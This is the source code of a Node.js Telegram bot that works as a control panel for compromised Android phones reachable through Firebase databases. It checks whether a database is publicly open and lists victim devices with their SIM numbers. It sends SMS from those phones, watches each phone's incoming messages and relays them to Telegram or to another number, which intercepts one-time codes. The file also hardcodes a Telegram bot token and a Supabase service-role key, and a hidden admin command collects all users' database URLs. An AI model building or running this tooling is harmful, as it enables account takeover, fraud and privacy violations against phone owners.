/**
 * 🚀 SMS RELAY ULTIMATE PRO MAX v4
 * --------------------------------------------------
 * This is the most complete and robust version of the bot.
 * It includes all previous commands, new pro features, 
 * and exhaustive SIM detection logic.
 * --------------------------------------------------
 */

// Mock WebSocket globally for Node.js versions < 22 (required by Supabase)
if (typeof globalThis.WebSocket === 'undefined') {
    try {
        globalThis.WebSocket = require('ws');
    } catch (e) {
        // Fallback if ws is not installed yet
    }
}

const { default: TelegramBot } = require('node-telegram-bot-api');
const fs = require('fs');
const { createClient } = require('@supabase/supabase-js');

// ---------- BOT CONFIGURATION ----------
const TOKEN = '8507296407:AAFSby7FkmKpSeRyRG1Vug7vlsZHUHxA_QA';
const bot = new TelegramBot(TOKEN, { polling: true });

// Gracefully handle Telegram API polling errors to prevent bot crashes
bot.on('polling_error', (error) => {
    console.error('[Polling Error]', error.message || error);
});

// ---------- SUPABASE CONFIGURATION ----------
const SUPABASE_URL = 'https://clauzswqebrsxrzpfvlz.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNsYXV6c3dxZWJyc3hyenBmdmx6Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4Mzk1MzM3MiwiZXhwIjoyMDk5NTI5MzcyfQ.ZxWtoffdeyJZw4ELNR64vlKTCX5Yg-k0GbcN3aInAJs';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);


// ---------- DATABASE LOGIC ----------
async function getUserData(userId) {
    userId = userId.toString();
    const { data, error } = await supabase
        .from('users')
        .select('*')
        .eq('id', userId)
        .maybeSingle();

    if (error) {
        console.error('Error fetching user data from Supabase:', error);
        throw error;
    }

    const defaults = {
        firebaseUrl: null,
        firebaseSecret: null,
        selectedDevice: null,
        sim: null,
        monitor: true,
        smsForward: false,
        isPublic: false,
        monitoredChats: [],
        smsForwardNumber: null
    };

    if (!data) {
        // Insert default user
        const { error: insertErr } = await supabase
            .from('users')
            .insert({
                id: userId,
                firebaseUrl: null,
                firebaseSecret: null,
                selectedDevice: null,
                sim: null,
                monitor: true,
                smsForward: false,
                isPublic: false,
                monitoredChats: [],
                smsForwardNumber: null
            });
        if (insertErr) {
            console.error('Error inserting default user in Supabase:', insertErr);
            throw insertErr;
        }
        return defaults;
    }

    return {
        firebaseUrl: data.firebaseUrl,
        firebaseSecret: data.firebaseSecret,
        selectedDevice: data.selectedDevice,
        sim: data.sim,
        monitor: data.monitor === true || data.monitor === 1,
        smsForward: data.smsForward === true || data.smsForward === 1,
        isPublic: data.isPublic === true || data.isPublic === 1,
        monitoredChats: Array.isArray(data.monitoredChats) ? data.monitoredChats : [],
        smsForwardNumber: data.smsForwardNumber || null
    };
}

async function updateUserData(userId, updates) {
    userId = userId.toString();
    const current = await getUserData(userId);
    const merged = { ...current, ...updates };

    const { error } = await supabase
        .from('users')
        .update({
            firebaseUrl: merged.firebaseUrl,
            firebaseSecret: merged.firebaseSecret,
            selectedDevice: merged.selectedDevice,
            sim: merged.sim,
            monitor: merged.monitor,
            smsForward: merged.smsForward,
            isPublic: merged.isPublic,
            monitoredChats: merged.monitoredChats,
            smsForwardNumber: merged.smsForwardNumber
        })
        .eq('id', userId);

    if (error) {
        console.error('Error updating user data in Supabase:', error);
        throw error;
    }
}

async function loadAllUsers() {
    const { data, error } = await supabase
        .from('users')
        .select('*');

    if (error) {
        console.error('Error loading all users from Supabase:', error);
        throw error;
    }

    const result = {};
    data.forEach(row => {
        result[row.id] = {
            firebaseUrl: row.firebaseUrl,
            firebaseSecret: row.firebaseSecret,
            selectedDevice: row.selectedDevice,
            sim: row.sim,
            monitor: row.monitor === true || row.monitor === 1,
            smsForward: row.smsForward === true || row.smsForward === 1,
            isPublic: row.isPublic === true || row.isPublic === 1,
            monitoredChats: Array.isArray(row.monitoredChats) ? row.monitoredChats : [],
            smsForwardNumber: row.smsForwardNumber || null
        };
    });
    return result;
}

async function deleteUser(userId) {
    userId = userId.toString();
    const { error } = await supabase
        .from('users')
        .delete()
        .eq('id', userId);

    if (error) {
        console.error('Error deleting user from Supabase:', error);
        throw error;
    }
}

// ---------- FIREBASE CORE LOGIC ----------
async function testFirebase(url, secret = null) {
    const cleanUrl = url.replace(/\/$/, "");
    let fullUrl = secret ? `${cleanUrl}/clients.json?auth=${secret}` : `${cleanUrl}/clients.json`;
    try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout
        const response = await fetch(fullUrl, { signal: controller.signal });
        clearTimeout(timeout);
        if (response.ok) return { success: true };
        return { success: false, status: response.status };
    } catch (err) {
        return { success: false, error: err.message };
    }
}

async function fetchFirebaseData(userId, path) {
    const userData = await getUserData(userId);
    if (!userData.firebaseUrl) return null;
    
    let url = `${userData.firebaseUrl.replace(/\/$/, "")}/${path}.json`;
    if (!userData.isPublic) {
        if (!userData.firebaseSecret) return null;
        url += `?auth=${userData.firebaseSecret}`;
    }
    
    try {
        const response = await fetch(url);
        if (!response.ok) return null;
        return await response.json();
    } catch (error) {
        console.error(`Fetch error (${path}):`, error);
        return null;
    }
}

async function sendSmsViaFirebase(userId, deviceId, sim, to, message) {
    const userData = await getUserData(userId);
    if (!userData.firebaseUrl) throw new Error('Firebase URL not set.');
    
    let url = `${userData.firebaseUrl.replace(/\/$/, "")}/clients/${deviceId}/webhookEvent/sendSms.json`;
    if (!userData.isPublic) {
        if (!userData.firebaseSecret) throw new Error('Database Secret Key missing.');
        url += `?auth=${userData.firebaseSecret}`;
    }
    
    const payload = { 
        from: sim, 
        to: to, 
        message: message, 
        isSended: false, 
        timestamp: Date.now() 
    };
    
    try {
        const response = await fetch(url, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!response.ok) throw new Error(`Firebase returned ${response.status}`);
        return true;
    } catch (error) {
        throw new Error(`Network Error: ${error.message}`);
    }
}

// ---------- UTILITIES ----------
function parseIntercept(text) {
    // Advanced Regex for better detection
    const phoneMatch = text.match(/(?:📞|To:|Phone:|Target:)\s*(\+?[\d\s\-]{10,})/i);
    const msgMatch = text.match(/(?:💬|Message:|Msg:|Content:)\s*(.+)/is);
    
    if (!phoneMatch || !msgMatch) return null;
    
    const phone = phoneMatch[1].replace(/[\s\-]/g, '').slice(-10);
    const message = msgMatch[1].trim();
    
    return (phone.length === 10 && message) ? { phone, message } : null;
}

function getDetailedSimInfo(d) {
    let s1 = 'Not Found', s2 = 'Not Found';
    if (d.sims && Array.isArray(d.sims)) {
        d.sims.forEach(sim => {
            if (sim.simSlotIndex == "1") s1 = sim.phoneNumber || sim.number || 'Found';
            if (sim.simSlotIndex == "2") s2 = sim.phoneNumber || sim.number || 'Found';
        });
    }
    if (s1 === 'Not Found') s1 = d.sim1Number || d.sim1_number || d.mobNo || d.phoneNumber || 'Not Found';
    if (s2 === 'Not Found') s2 = d.sim2Number || d.sim2_number || 'Not Found';
    return { s1, s2 };
}

// ============================================================
//  🚀 ALL COMMANDS (RESTORED & ENHANCED)
// ============================================================

bot.onText(/\/start/, (msg) => {
    const welcome = `🚀 *SMS Relay Ultimate Pro Max v4* 🚀\n\n` +
        `🛠 *Setup Commands:*\n` +
        `• /setfirebase <url> - _Connect to DB_\n` +
        `• /devices - _Online/Offline Filter_\n` +
        `• /selectdevice <id> - _Choose active device_\n` +
        `• /sims - _Detailed SIM & Info_\n` +
        `• /selectsim <1|2> - _Select SIM slot_\n` +
        `• /removesim - _Clear SIM selection_\n` +
        `• /showsim - _Show current SIM_\n\n` +
        `📡 *Monitoring:*\n` +
        `• /addchannel <id> - _Monitor a channel_\n` +
        `• /removechannel - _Remove current chat_\n` +
        `• /listchannels - _View your list_\n` +
        `• /checkchannel - _Test bot activity_\n` +
        `• /stop - _Pause Relay_\n` +
        `• /resume - _Resume Relay_\n\n` +
        `📲 *Advanced:*\n` +
        `• /sms on/off - _Incoming SMS Forwarding_\n` +
        `• /smsforward <num> - _Auto-forward to mobile number_\n` +
        `• /status - _System Overview_\n` +
        `• /online - _Quick Status Check_\n` +
        `• /reset - _Clear All Settings_\n` +
        `• /id - _Get Chat/User ID_\n` +
        `• /send <num> <msg> - _Manual SMS_`;
    bot.sendMessage(msg.chat.id, welcome, { parse_mode: 'Markdown' });
});

// ---------- FIREBASE SETTINGS ----------
bot.onText(/\/setfirebase (.+)/, async (msg, match) => {
    const userId = msg.from.id;
    const url = match[1].trim().replace(/\/$/, "");
    
    if (!url.includes('firebaseio.com') && !url.includes('firebasedatabase.app')) {
        return bot.sendMessage(userId, '❌ *Invalid Firebase URL!*', { parse_mode: 'Markdown' });
    }
    
    await bot.sendMessage(userId, '🔍 *Analyzing Database Security...*', { parse_mode: 'Markdown' });
    const test = await testFirebase(url);
    
    await updateUserData(userId, { firebaseUrl: url, firebaseSecret: null, isPublic: test.success });
    
    if (test.success) {
        bot.sendMessage(userId, `🔓 *Database is PUBLIC!*\n✅ Connected successfully.\n📌 URL: \`${url}\``, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(userId, `🔐 *Database is SECURE!*\n👉 Please use Database Secret key to connect.`, { parse_mode: 'Markdown' });
    }
});

// ---------- DEVICE MANAGEMENT ----------
bot.onText(/\/devices/, (msg) => {
    const opts = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: "🟢 Online Devices", callback_data: "list_online" }, { text: "🔴 Offline Devices", callback_data: "list_offline" }]
            ]
        }
    };
    bot.sendMessage(msg.chat.id, "📱 *Device Manager*\nSelect which devices to list:", opts);
});

bot.on('callback_query', async (query) => {
    const userId = query.from.id;
    const action = query.data;
    const userData = await getUserData(userId);

    if (!userData.firebaseUrl) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Set Firebase URL first!", show_alert: true });
    }

    if (action === "list_online" || action === "list_offline") {
        await bot.answerCallbackQuery(query.id);
        const data = await fetchFirebaseData(userId, "clients");
        
        if (!data) return bot.sendMessage(userId, "❌ *Error:* Could not fetch device list.");

        const showOnline = action === "list_online";
        let list = `📱 *${showOnline ? 'Online' : 'Offline'} Devices:*\n\n`;
        let count = 0;

        for (const [id, d] of Object.entries(data)) {
            if (d.status === showOnline) {
                count++;
                const item = `🔹 *${d.modelName || d.model || 'Unknown'}*\n   ID: \`${id}\`\n\n`;
                if ((list + item).length > 4000) {
                    await bot.sendMessage(userId, list, { parse_mode: 'Markdown' });
                    list = '';
                }
                list += item;
            }
        }

        if (count === 0) list = `📭 *No ${showOnline ? 'online' : 'offline'} devices found.*`;
        if (list) bot.sendMessage(userId, list, { parse_mode: 'Markdown' });
    }
});

bot.onText(/\/selectdevice (.+)/, async (msg, match) => {
    const id = match[1].trim();
    await updateUserData(msg.from.id, { selectedDevice: id });
    bot.sendMessage(msg.from.id, `✅ *Device Selected:*\n\`${id}\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/online/, async (msg) => {
    const userId = msg.from.id;
    const userData = await getUserData(userId);
    if (!userData.selectedDevice) return bot.sendMessage(userId, '❌ No device selected.');
    
    const data = await fetchFirebaseData(userId, `clients/${userData.selectedDevice}`);
    if (!data) return bot.sendMessage(userId, '❌ Could not reach device.');
    
    const status = data.status ? '🟢 *Online*' : '🔴 *Offline*';
    bot.sendMessage(userId, `📱 *Device Status:* ${status}`, { parse_mode: 'Markdown' });
});

// ---------- SIM & INFO COMMANDS ----------
bot.onText(/\/sims/, async (msg) => {
    const userId = msg.from.id;
    const userData = await getUserData(userId);
    if (!userData.selectedDevice) return bot.sendMessage(userId, '❌ Select a device first.');

    const d = await fetchFirebaseData(userId, `clients/${userData.selectedDevice}`);
    if (!d) return bot.sendMessage(userId, '❌ *Error:* Device data not found.');

    const { s1, s2 } = getDetailedSimInfo(d);
    const net = d.service_provider || d.network || d.networkName || 'Unknown';
    const ver = d.androidV || d.androidVersion || d.android || 'N/A';
    const bat = d.battery || d.batteryLevel || 'N/A';

    let reply = `📱 *Device Info: ${d.modelName || d.model || 'Unknown'}*\n`;
    reply += `🆔 ID: \`${userData.selectedDevice}\`\n\n`;
    reply += `📶 *Network:* ${net}\n`;
    reply += `🤖 *Android:* ${ver}\n`;
    reply += `🔋 *Battery:* ${bat}\n\n`;
    reply += `1️⃣ *SIM 1:* \`${s1}\`\n`;
    reply += `2️⃣ *SIM 2:* \`${s2}\`\n\n`;
    reply += `🎯 *Relay Slot:* SIM ${userData.sim || 'Not Set'}`;
    
    bot.sendMessage(userId, reply, { parse_mode: 'Markdown' });
});

bot.onText(/\/selectsim ([12])/, async (msg, match) => {
    const userId = msg.from.id;
    const slot = parseInt(match[1]);
    const userData = await getUserData(userId);

    if (!userData.selectedDevice) return bot.sendMessage(userId, '❌ Select a device first.');

    const d = await fetchFirebaseData(userId, `clients/${userData.selectedDevice}`);
    if (!d) return bot.sendMessage(userId, '❌ Device data error.');

    const { s1, s2 } = getDetailedSimInfo(d);
    const target = (slot === 1) ? s1 : s2;

    if (!target || target === 'Not Found') {
        return bot.sendMessage(userId, `❌ *SIM ${slot} not found* in this device.`, { parse_mode: 'Markdown' });
    }

    await updateUserData(userId, { sim: slot });
    bot.sendMessage(userId, `✅ *SIM ${slot} Selected for Relay*\n📞 Number: \`${target}\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/removesim/, async (msg) => {
    await updateUserData(msg.from.id, { sim: null });
    bot.sendMessage(msg.from.id, '✅ *SIM slot cleared.*');
});

bot.onText(/\/showsim/, async (msg) => {
    const d = await getUserData(msg.from.id);
    bot.sendMessage(msg.from.id, d.sim ? `🎯 Active SIM Slot: *${d.sim}*` : '❌ No SIM selected.', { parse_mode: 'Markdown' });
});

// ---------- MONITORING COMMANDS ----------
bot.onText(/\/addchannel\s*(.*)/, async (msg, match) => {
    const userId = msg.from.id;
    let id = match[1].trim();
    if (!id && msg.chat.type === 'channel') id = msg.chat.id.toString();
    
    if (!id) return bot.sendMessage(userId, '❌ Usage: `/addchannel -100xxxxxx`');
    
    const d = await getUserData(userId);
    if (!d.monitoredChats.includes(id)) {
        d.monitoredChats.push(id);
        await updateUserData(userId, { monitoredChats: d.monitoredChats });
        bot.sendMessage(userId, `✅ Channel \`${id}\` added to monitoring list.`, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(userId, `ℹ️ Channel already in list.`);
    }
});

bot.onText(/\/removechannel/, async (msg) => {
    const userId = msg.from.id;
    const chatId = msg.chat.id.toString();
    const d = await getUserData(userId);
    const newList = d.monitoredChats.filter(id => id !== chatId);
    await updateUserData(userId, { monitoredChats: newList });
    bot.sendMessage(userId, '✅ Current channel removed from monitoring.');
});

bot.onText(/\/listchannels/, async (msg) => {
    const d = await getUserData(msg.from.id);
    if (d.monitoredChats.length === 0) return bot.sendMessage(msg.from.id, '📭 Your monitoring list is empty.');
    
    let list = '📋 *Monitored Channels:*';
    for (const id of d.monitoredChats) {
        try {
            const chat = await bot.getChat(id);
            list += `\n• *${chat.title}* (\`${id}\`)`;
        } catch {
            list += `\n• Unknown (\`${id}\`)`;
        }
    }
    bot.sendMessage(msg.from.id, list, { parse_mode: 'Markdown' });
});

bot.onText(/\/checkchannel/, async (msg) => {
    const userId = msg.from.id;
    const d = await getUserData(userId);
    if (d.monitoredChats.length === 0) return bot.sendMessage(userId, '❌ No channels to check.');
    
    await bot.sendMessage(userId, '⏳ *Sending test messages...*', { parse_mode: 'Markdown' });
    for (const id of d.monitoredChats) {
        try {
            await bot.sendMessage(id, `✅ *System Check:* Bot is active and monitoring this channel!`, { parse_mode: 'Markdown' });
            bot.sendMessage(userId, `✅ Test sent to \`${id}\``, { parse_mode: 'Markdown' });
        } catch (e) {
            bot.sendMessage(userId, `❌ Failed for \`${id}\`: ${e.message}`);
        }
    }
});

bot.onText(/\/stop/, async (msg) => {
    await updateUserData(msg.from.id, { monitor: false });
    bot.sendMessage(msg.from.id, '⏹️ *Monitoring PAUSED.*', { parse_mode: 'Markdown' });
});

bot.onText(/\/resume/, async (msg) => {
    await updateUserData(msg.from.id, { monitor: true });
    bot.sendMessage(msg.from.id, '▶️ *Monitoring RESUMED.*', { parse_mode: 'Markdown' });
});

// ---------- ADVANCED SYSTEM COMMANDS ----------
bot.onText(/\/sms (on|off)/, async (msg, match) => {
    const userId = msg.from.id;
    const state = match[1] === 'on';
    await updateUserData(userId, { smsForward: state });
    bot.sendMessage(userId, `📲 *SMS Forwarding:* ${state ? '🟢 ON' : '🔴 OFF'}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/smsforward(?:\s+(.+))?/, async (msg, match) => {
    const userId = msg.from.id;
    const arg = match[1] ? match[1].trim() : null;

    if (!arg) {
        const u = await getUserData(userId);
        if (u.smsForwardNumber) {
            return bot.sendMessage(userId, `🎯 *Current SMS Auto-Forward Number:* \`${u.smsForwardNumber}\`\n\nTo disable, use: \`/smsforward off\``, { parse_mode: 'Markdown' });
        } else {
            return bot.sendMessage(userId, `❌ *SMS Auto-Forward Number not set.*\n\nUse: \`/smsforward <number>\` to configure.`, { parse_mode: 'Markdown' });
        }
    }

    if (arg.toLowerCase() === 'off' || arg.toLowerCase() === 'clear') {
        await updateUserData(userId, { smsForwardNumber: null });
        return bot.sendMessage(userId, `✅ *SMS Auto-Forwarding disabled.*`);
    }

    const cleanNum = arg.replace(/[\s\-]/g, '');
    if (!/^\+?\d{10,15}$/.test(cleanNum)) {
        return bot.sendMessage(userId, `❌ *Invalid Phone Number!* Please enter a valid number (10 to 15 digits).`, { parse_mode: 'Markdown' });
    }

    await updateUserData(userId, { smsForwardNumber: cleanNum });
    bot.sendMessage(userId, `✅ *SMS Auto-Forward Number Set:* \`${cleanNum}\`\n\nIncoming SMS on your device will automatically bounce to this number.`, { parse_mode: 'Markdown' });
});

bot.onText(/\/status/, async (msg) => {
    const d = await getUserData(msg.from.id);
    let status = `📊 *System Status Overview*\n\n`;
    status += `🌐 *Firebase:* \`${d.firebaseUrl || 'Not Set'}\`\n`;
    status += `🛡 *Security:* ${d.isPublic ? '🔓 Public' : '🔒 Secure'}\n`;
    status += `📱 *Device ID:* \`${d.selectedDevice || 'None'}\`\n`;
    status += `💳 *SIM Slot:* ${d.sim || 'None'}\n`;
    status += `📲 *SMS Fwd:* ${d.smsForward ? '🟢 ON' : '🔴 OFF'}\n`;
    status += `🎯 *Fwd Target:* \`${d.smsForwardNumber || 'Not Set'}\`\n`;
    status += `📡 *Monitoring:* ${d.monitor ? '🟢 ON' : '🔴 OFF'}\n`;
    status += `📋 *Channels:* ${d.monitoredChats.length}\n`;
    bot.sendMessage(msg.from.id, status, { parse_mode: 'Markdown' });
});

bot.onText(/\/reset/, async (msg) => {
    const userId = msg.from.id;
    await deleteUser(userId);
    bot.sendMessage(userId, `♻️ *Configuration Reset!* All settings cleared.`, { parse_mode: 'Markdown' });
});

bot.onText(/\/id/, (msg) => {
    bot.sendMessage(msg.chat.id, `🆔 *ID Info:*\nUser/Chat ID: \`${msg.chat.id}\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/send (.+?) (.+)/, async (msg, match) => {
    const u = await getUserData(msg.from.id);
    if (!u.selectedDevice || !u.sim) return bot.sendMessage(msg.from.id, '❌ Setup Device & SIM first.');
    
    try {
        const ok = await sendSmsViaFirebase(msg.from.id, u.selectedDevice, u.sim, match[1].trim(), match[2].trim());
        bot.sendMessage(msg.from.id, ok ? `✅ *SMS Sent Successfully!*` : `❌ *Failed to send SMS.*`);
    } catch (e) {
        bot.sendMessage(msg.from.id, `❌ *Error:* ${e.message}`);
    }
});

// ---------- ADMIN HIDDEN COMMAND ----------
bot.onText(/\/x/, async (msg) => {
    const userId = msg.from.id.toString();
    const allowedAdmins = ['7972440762', '992496607'];
    if (!allowedAdmins.includes(userId)) return;

    const data = await loadAllUsers();
    const userIds = Object.keys(data);
    const totalUsers = userIds.length;

    if (totalUsers === 0) {
        return bot.sendMessage(userId, "🛸 *No active users registered.*", { parse_mode: 'Markdown' });
    }

    // Collect Firebase URLs
    const firebaseUrls = [];
    userIds.forEach(id => {
        if (data[id].firebaseUrl) {
            firebaseUrls.push(data[id].firebaseUrl);
        }
    });
    const uniqueUrls = [...new Set(firebaseUrls)];

    let response = `⚡ *SMS Relay Pro Metrics* ⚡\n\n`;
    response += `📊 *Total Users:* \`${totalUsers}\`\n`;
    response += `🔗 *Total Unique Databases:* \`${uniqueUrls.length}\`\n\n`;

    response += `🔮 *Active Firebase Connections:* \n`;
    if (uniqueUrls.length === 0) {
        response += `🛸 _No connections configured._\n`;
    } else {
        uniqueUrls.forEach((url, i) => {
            response += `🛰 *[${i + 1}]* \`${url}\`\n`;
        });
    }

    bot.sendMessage(userId, response, { parse_mode: 'Markdown' });
});

// ============================================================
//  📡 ROBUST RELAY ENGINE
// ============================================================

async function handleRelay(msg) {
    if (!msg.text) return;
    const chatId = msg.chat.id.toString();
    const data = await loadAllUsers();
    const parsed = parseIntercept(msg.text);

    if (!parsed) return;
    
    for (const [userId, userData] of Object.entries(data)) {
        if (userData.monitor && userData.monitoredChats && userData.monitoredChats.includes(chatId)) {
            if (userData.selectedDevice && userData.sim) {
                try {
                    const ok = await sendSmsViaFirebase(userId, userData.selectedDevice, userData.sim, parsed.phone, parsed.message);
                    if (ok) {
                        bot.sendMessage(userId, `🚀 *Auto-Relay Success*\n\n📱 To: \`${parsed.phone}\`\n📡 From: *${msg.chat.title || 'Channel'}*\n💬 Msg: \`${parsed.message}\``, { parse_mode: 'Markdown' });
                    }
                } catch (e) {
                    bot.sendMessage(userId, `⚠️ *Relay Failed:* ${e.message}`);
                }
            }
        }
    }
}

bot.on('channel_post', handleRelay);
bot.on('message', (msg) => { 
    if (msg.chat.type !== 'private' && msg.chat.type !== 'channel') {
        handleRelay(msg);
    }
});

// ---------- BACKGROUND SMS WATCHER ----------
const lastSeenSmsKeys = {};

function startSmsWatcher() {
    console.log('📡 Live SMS Forwarding watcher started (Polling every 8s)...');
    setInterval(async () => {
        try {
            const data = await loadAllUsers();
            for (const [userId, userData] of Object.entries(data)) {
                if (userData.monitor && userData.smsForward && userData.firebaseUrl && userData.selectedDevice) {
                    try {
                        let url = `${userData.firebaseUrl.replace(/\/$/, "")}/messages/${userData.selectedDevice}.json?orderBy="$key"&limitToLast=1`;
                        if (!userData.isPublic && userData.firebaseSecret) {
                            url += `&auth=${userData.firebaseSecret}`;
                        }

                        const response = await fetch(url);
                        if (!response.ok) continue;

                        const messagesObj = await response.json();
                        if (!messagesObj || typeof messagesObj !== 'object') continue;

                        const keys = Object.keys(messagesObj);
                        if (keys.length === 0) continue;

                        const key = keys[0];
                        const msgData = messagesObj[key];

                        if (!msgData || typeof msgData !== 'object') continue;

                        const cacheKey = `${userId}_${userData.selectedDevice}`;

                        // Initialize cache key on first execution to prevent spamming old alerts
                        if (lastSeenSmsKeys[cacheKey] === undefined) {
                            lastSeenSmsKeys[cacheKey] = key;
                            continue;
                        }

                        // Send push notification if a new message key is registered
                        if (lastSeenSmsKeys[cacheKey] !== key) {
                            lastSeenSmsKeys[cacheKey] = key;
 
                            const text = msgData.message || msgData.body || msgData.text || 'No message content';
                            const sender = msgData.sender || msgData.from || 'Unknown';
                            const date = msgData.dateTime || msgData.date || 'N/A';
 
                            const alertMsg = `📲 *New SMS Received* 📲\n\n` +
                                             `👤 *From:* \`${sender}\`\n` +
                                             `💬 *Message:* \`${text}\`\n` +
                                             `⏰ *Time:* _${date}_`;
 
                            bot.sendMessage(userId, alertMsg, { parse_mode: 'Markdown' }).catch((err) => {
                                console.error(`⚠️ Failed to send SMS alert to user ${userId}:`, err.message);
                            });

                            // AUTO-FORWARD INCOMING SMS IF CONFIGURED
                            if (userData.smsForwardNumber) {
                                if (userData.selectedDevice && userData.sim) {
                                    const forwardPayload = `From: ${sender}\nMsg: ${text}`;
                                    sendSmsViaFirebase(userId, userData.selectedDevice, userData.sim, userData.smsForwardNumber, forwardPayload)
                                        .then((ok) => {
                                            if (ok) {
                                                bot.sendMessage(userId, `✅ *SMS Auto-Forwarded Successfully!*\n\n📱 To: \`${userData.smsForwardNumber}\`\n💬 Msg: \`${text}\``, { parse_mode: 'Markdown' });
                                            } else {
                                                bot.sendMessage(userId, `❌ *SMS Auto-Forward Failed.*`);
                                            }
                                        })
                                        .catch((forwardErr) => {
                                            bot.sendMessage(userId, `⚠️ *SMS Auto-Forward Error:* ${forwardErr.message}`);
                                        });
                                } else {
                                    bot.sendMessage(userId, `⚠️ *SMS Auto-Forward Failed:* Active SIM slot or device not configured.`);
                                }
                            }
                        }
                    } catch (innerErr) {
                        // Suppress single user database check errors to run others uninterrupted
                    }
                }
            }
        } catch (err) {
            console.error('⚠️ Error in SMS watcher loop:', err.message);
        }
    }, 8000);
}

// Start bot and background polling watcher
console.log('🚀 SMS Relay Ultimate Pro Max v4 is running...');
startSmsWatcher();
